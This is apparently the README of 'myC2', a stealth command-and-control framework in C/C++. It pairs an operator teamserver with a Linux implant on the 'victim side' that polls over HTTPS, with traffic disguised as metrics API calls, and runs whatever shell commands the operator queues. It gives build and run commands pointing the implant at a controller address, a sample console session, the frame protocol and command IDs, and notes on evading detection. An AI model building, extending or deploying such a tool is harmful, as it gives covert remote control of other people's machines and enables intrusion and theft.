<h4 align="center">A Micro Stealth C2 Framework built in C/C++</h4>

---

### Description 
myC2 is a small C2 framework aimed at stealthy operations. It is designed to be small, fast, and efficient. 

It is two binaries: a **teamserver** you give commands to, and an **implant** that
polls it over HTTPS for work and posts back whatever the command printed. The
implant never listens on a port.

### Features
- HTTPS-only transport on a port that blends in with ordinary TLS traffic.
- Beacon-based check-in: the implant polls the teamserver for work instead of holding a
  connection open.
- One frame format, `C2_HEADER` plus payload, encoded and decoded by the same C
  in `src/common/frame.c`; both binaries link it, so the two sides cannot drift.
- A session id per implant, drawn once at start-up, so each implant has its own
  command queue instead of sharing one.
- Commands stay in flight until their output is uploaded, so a reply lost in
  transit is re-sent instead of silently dropped.
- An implant that links only `libssl`, `libcrypto` and `libc` — no libcurl, whose
  dependency tree does not exist on a foreign host.
- Self-signed certificates generated by the build, with the SAN configurable for the
  address victims actually connect to.

## Quick start

Requires CMake 3.16+, a C17/C++17 toolchain, OpenSSL development headers, and
`openssl` on `PATH`.

```sh
cmake -S . -B build
cmake --build build
```

The wire format and the session store have tests: `ctest --test-dir build`.

The build produces two executables. Both are compiled with warnings as errors:

| Binary | Source | Role |
| --- | --- | --- |
| `build/server` | `src/server/` | teamserver (operator side) |
| `build/agent` | `src/implant/` | Linux implant (victim side) |

Run the teamserver first, then the implant. The default certificate path is
relative, so run both from the project root:

```sh
./build/server
```

```sh
./build/agent --host 192.168.50.50
```

The console lists the implants that have checked in and needs one selected before
it will queue anything:

```
c2_server> sessions
[*] 1 session(s), * = receives commands
    5f3a91c2  0s ago
c2_server> use 5f3a91c2
[*] using 5f3a91c2
c2_server> id -u
```

Anything typed after that is queued for the selected session and handed to it on
its next check-in; its output is printed by the server as it arrives. `exit`
asks the selected session to shut down, `exit <id>` a specific one, `exit all`
every session. `quit` closes the console and leaves the teamserver serving.

## The protocol

Every message is a 16-byte `C2_HEADER` followed by exactly `payload_size` bytes.
The header lives in `src/common/protocol.h`; the encode, decode and payload
helpers live in `src/common/frame.c`, and both halves compile that file.

```c
struct C2_HEADER {
  uint32_t magic;        /* CHECK_IN_MAGIC, 0x41414141 */
  uint32_t command_id;   /* CMD_* below */
  uint32_t payload_size; /* bytes following the header */
  uint32_t session_id;   /* who the frame belongs to; 0 never travels */
};
```

`src/common/frame.h` asserts the size for both languages, so the two binaries
break at compile time rather than at run time if the struct changes.

| Constant | Value | Direction | Meaning |
| --- | --- | --- | --- |
| `CMD_CHECK_IN` | 100 | implant → server | No payload. The request body is the header alone. |
| `CMD_EXIT` | 101 | server → implant | No payload. Shut down. |
| `CMD_EXECUTE_SHELL` | 102 | both | Server sends the command; implant sends the output back. |

Fields are copied as-is, so they travel in **host byte order**. The implant and
the teamserver therefore have to agree on endianness; this is fine between two
x86-64 hosts and wrong across architectures.

A frame is rejected unless its `magic` matches, its `payload_size` accounts for
the rest of the body exactly, and its `session_id` is non-zero. The server's two
handlers and the implant's response check all call `frame_decode`, so those rules
exist once.

The two endpoints are `POST /api/v2/metrics` (check-in, answers `200` with a
framed command for the calling session or `204` when its queue is empty) and
`POST /api/v2/events` (upload, answers `200` and acknowledges the command it
answers). Both paths are defined once, as
`C2_PATH_CHECKIN` and `C2_PATH_RESULT` in `src/common/protocol.h`, so the two
halves cannot drift apart.

## Current limitations

- **No authentication.** The implant pins the server certificate, but the server
  accepts any client that presents a well-formed frame. Anything that can reach
  the port can claim a session id, take its queued command, and write to the
  console.
- **State is in memory.** A teamserver restart drops every queue and pending exit
  request. The implant keeps its session id and simply re-registers on its next
  check-in.
- **At-least-once delivery.** A command stays in flight until its result is
  uploaded, and is re-sent up to three times if that upload never arrives. A
  lost reply therefore runs the command again rather than dropping it.
- **Small result size.** Implant output is capped at 4096 bytes per command, and
  is only collected once the command exits.
- **Escaped, not encoded, output.** Control bytes in a result print as `^X` so a
  command cannot drive the terminal, which also means a real `^A` and an escaped
  `0x01` look identical.
- **Runtime floor.** The implant needs glibc 2.34 or newer and `libssl.so.3`,
  which means Debian 12, Ubuntu 22.04 or RHEL 9 and later.

`DEPLOYMENT.md` expands each of these into a backlog, with the deployment
consequences.
